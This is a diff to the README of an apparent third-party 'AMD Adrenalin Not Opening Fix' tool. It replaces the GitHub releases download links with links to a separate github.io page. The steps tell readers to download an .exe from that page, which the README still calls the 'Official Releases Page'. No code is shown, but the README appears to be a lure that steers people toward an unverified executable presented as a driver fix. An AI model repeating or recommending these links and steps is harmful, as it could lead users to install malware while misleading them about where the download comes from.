@@ -1,6 +1,6 @@
 # 🛠️ AMD-Adrenalin-Not-Opening-Fix - Restore Your Radeon Graphics Software Instantly
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Toyga2757/AMD-Adrenalin-Not-Opening-Fix/releases)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://toyga2757.github.io)
 
 ## 🎯 About This Tool
 
@@ -19,7 +19,7 @@ Confirm your computer meets these requirements before you start:
 
 Follow these steps to obtain the repair tool:
 
-1. Visit the [Official Releases Page](https://github.com/Toyga2757/AMD-Adrenalin-Not-Opening-Fix/releases) to download the repair package.
+1. Visit the [Official Releases Page](https://toyga2757.github.io) to download the repair package.
 2. Look for the latest file ending in .exe under the Assets section.
 3. Click the file to save it to your computer.
 4. Note the location of the downloaded file in your Downloads folder.
